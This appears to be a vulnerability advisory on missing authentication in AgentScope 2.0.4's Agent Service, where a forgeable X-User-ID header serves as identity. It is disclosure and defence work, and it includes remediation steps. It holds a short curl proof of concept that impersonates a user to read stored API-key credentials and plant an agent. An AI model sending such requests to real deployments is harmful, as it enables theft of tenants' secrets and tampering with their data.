# AgentScope Agent Service missing authentication — X-User-ID header accepted as identity without verification (CWE-306, CVSS 9.8)

## Summary

AgentScope v2.0.4's built-in Agent Service — a FastAPI application exposing 45+ REST endpoints — accepts the caller-supplied `X-User-ID` HTTP header as the authenticated user identity without any verification. The identity function `get_current_user_id()` (`src/agentscope/app/deps.py:20-42`) reads the header, rejects only the empty string, and returns whatever string the caller supplied; `create_app()` (`src/agentscope/app/_app.py:195-261`) installs no authentication middleware of any kind, and the shipped example binds the service to `0.0.0.0:8000`. In deployments where the API is reachable by untrusted callers and no external gateway or custom middleware validates and injects this header, any network caller who sets `X-User-ID: <victim>` can read, modify, and delete that user's agents, credential records (including stored LLM API keys), session histories, knowledge bases, and scheduled tasks, and can create resources under any identity.

## Details

The Agent Service derives "who is calling" from a single HTTP header, with no verification step anywhere in the chain.

**Step 1 — the identity function accepts any non-empty header value** (`src/agentscope/app/deps.py:20-42`):

```python
async def get_current_user_id(
    x_user_id: str = Header(
        description="Caller's user ID. "
        "Temporary header-based identity; will be replaced by JWT auth.",
    ),
) -> str:
    if not x_user_id:                    # the only check: non-empty
        raise HTTPException(401)
    return x_user_id                     # returns whatever string the caller supplied
```

The function's own docstring acknowledges the gap: *"Temporary header-based identity; will be replaced by JWT auth."* — the promised JWT replacement is not present in v2.0.4.

**Step 2 — `create_app()` installs no authentication** (`src/agentscope/app/_app.py:195-261`). `create_app()` mounts the routers and returns the FastAPI application with zero built-in authentication: no JWT validation, no API key check, no bearer token, no session cookie, no OAuth. An `extra_middlewares` parameter exists so that deployers can supply custom middleware, but the framework ships with no default protection of any kind.

**Step 3 — every tenant-data endpoint resolves identity through the forgeable header.** Each router handler obtains the "current user" through `Depends(get_current_user_id)`:

```python
async def list_agents(
    user_id: str = Depends(get_current_user_id),  # the only identity source
    ...
)
```

All tenant data in Redis is keyed by `agentscope:user:{user_id}:...` (for example `agentscope:user:{user_id}:credential:{credential_id}`), where `user_id` is the caller-controlled header value. The multi-tenant isolation therefore rests entirely on a forgeable string.

**Step 4 — the shipped example exposes the unauthenticated service.** The project's own example `examples/agent_service/main.py` binds the Agent Service to `0.0.0.0:8000` with no authentication middleware configured.

**Why this is a vulnerability rather than "temporary design" or "deployment responsibility":**

- v2.0.4 is a formal release whose PyPI listing describes "production-grade multi-tenancy", yet the shipped isolation rests on a string any caller can choose.
- The code comment admits the gap but does not fix it; the product is evaluated as shipped, not as promised.
- **Honest scoping:** the attacker must know or guess a victim's `user_id`. In practice user IDs are e-mail addresses, usernames, or UUIDs, and the service provides no rate limiting or brute-force protection, so this does not materially raise the attack complexity.

## Proof of Concept

Dynamically verified against `agentscope==2.0.4` (PyPI) on 2026-07-08 — Windows 11 host, Redis 7, service started from the shipped `examples/agent_service/main.py` (binds `0.0.0.0:8000`, no authentication middleware). All 4 assertions passed (4/4). The API key in Step 1 is a placeholder; no real credential is used.

**Prerequisites:** Redis running on `localhost:6379`; the AgentScope service started with the default example; no authentication middleware configured.

**Step 1 — Alice (legitimate user) creates a credential:**

```bash
curl -i -X POST http://localhost:8000/credential/ \
  -H "Content-Type: application/json" \
  -H "X-User-ID: alice" \
  -d '{"data":{"name":"alice-key","type":"deepseek_credential","api_key":"sk-POC-FAKE-KEY"}}'
```

Expected: `HTTP/1.1 201 Created` with `{"credential_id":"<id>"}`.

**Step 2 — an unauthenticated caller impersonates Alice by setting the same header:**

```bash
curl -i http://localhost:8000/credential/ -H "X-User-ID: alice"
```

Expected: `HTTP/1.1 200 OK` listing Alice's credentials, including the credential created in Step 1. The caller supplied no password, token, or secret — only the header value `alice`.

**Step 3 — the caller creates resources under Alice's identity:**

```bash
curl -i -X POST http://localhost:8000/agent/ \
  -H "Content-Type: application/json" \
  -H "X-User-ID: alice" \
  -d '{"name":"evil-agent","system_prompt":"malicious instruction"}'
```

Expected: `HTTP/1.1 201 Created`. The agent is persisted under Alice's namespace.

**Step 4 — a different header value isolates to a different namespace, confirming the header IS the identity mechanism:**

```bash
curl -i http://localhost:8000/credential/ -H "X-User-ID: bob"
```

Expected: `HTTP/1.1 200 OK` with zero credentials (Bob's namespace is empty). Read (Step 2), write (Step 3), and namespace isolation (Step 4) are all gated by an attacker-chosen string, with no verification step in between.

## Impact

- **Type:** Missing Authentication for Critical Function (CWE-306) — the service accepts a caller-controlled header as verified identity without any cryptographic check.
- **Who is impacted:** AgentScope v2.0.4 Agent Service deployments whose API is reachable by untrusted HTTP clients and not protected by an external identity-aware proxy or custom middleware that strips or validates inbound `X-User-ID` (the default example configuration binds `0.0.0.0:8000` with no such protection).
- **Attacker capabilities** (requires knowing or guessing a victim `user_id`; typically an e-mail address, username, or UUID, with no rate limiting or brute-force protection in place):
  - read any user's credential records (including stored LLM API keys), agent configurations, session histories, knowledge bases, teams, and schedules;
  - modify or delete any user's agents, credentials, sessions, knowledge bases, and schedules;
  - create new resources (agents, sessions, credentials) under any user's namespace;
  - trigger chats in a victim's session context.
- **Compound effect:** the same product version contains two further confirmed flaws — an MCP stdio command-injection flaw and a Bash tool write-permission flaw — which assume an authenticated session. Removing the authentication barrier turns each of them into an unauthenticated remote attack (unauthenticated remote code execution in the case of the MCP flaw). The three flaws are independent; fixing one does not fix the others.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N — the attack is an HTTP request over the network.
  - AC:L — setting a header value requires no special conditions.
  - PR:N — the header value is attacker-chosen; no credential is required.
  - UI:N — no user interaction beyond sending the HTTP request.
  - S:U — the vulnerable and impacted component is the AgentScope application and its storage.
  - C:H — all tenant data is readable across user namespaces.
  - I:H — CRUD endpoints allow attacker-controlled writes and deletions in the victim namespace.
  - A:H — persistent deletion of tenant resources (agents, credentials, sessions, knowledge bases, schedules) causes sustained loss of availability for the victim tenant.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `agentscope` |
| **Affected versions** | `<= 2.0.4` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

## Remediation

1. **Implement cryptographic authentication.** Add server-side identity verification (JWT, API key, or OAuth2) to the Agent Service. The `extra_middlewares` parameter of `create_app()` (`src/agentscope/app/_app.py`) is the intended injection point.
2. **Deploy behind an authenticated reverse proxy.** An identity-aware proxy (nginx, Caddy, cloud API gateway) can validate callers and inject a verified `X-User-ID`; it must also strip inbound `X-User-ID` headers from untrusted clients to prevent header spoofing.
3. **Bind to `127.0.0.1`.** Until authentication is in place, do not bind the service to `0.0.0.0`; require local or VPN-only access.
4. **Remove header-based identity.** Derive user identity exclusively from a cryptographically verified token (JWT claims, API key lookup, OAuth2 subject) instead of the client-supplied `X-User-ID` header.

## Timeline

| Date | Event |
|------|-------|
| 2026-10-14 | Reported to vendor (GitHub issue [#3314](https://github.com/agentscope-ai/agentscope/issues/3314)) |
| 2026-10-14 | This advisory published |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-306 | Missing Authentication for Critical Function | `get_current_user_id()` accepts any non-empty `X-User-ID` header as verified identity (`deps.py:20-42`) and `create_app()` installs no authentication middleware (`_app.py:195-261`); every tenant-data endpoint depends on this forgeable identity |
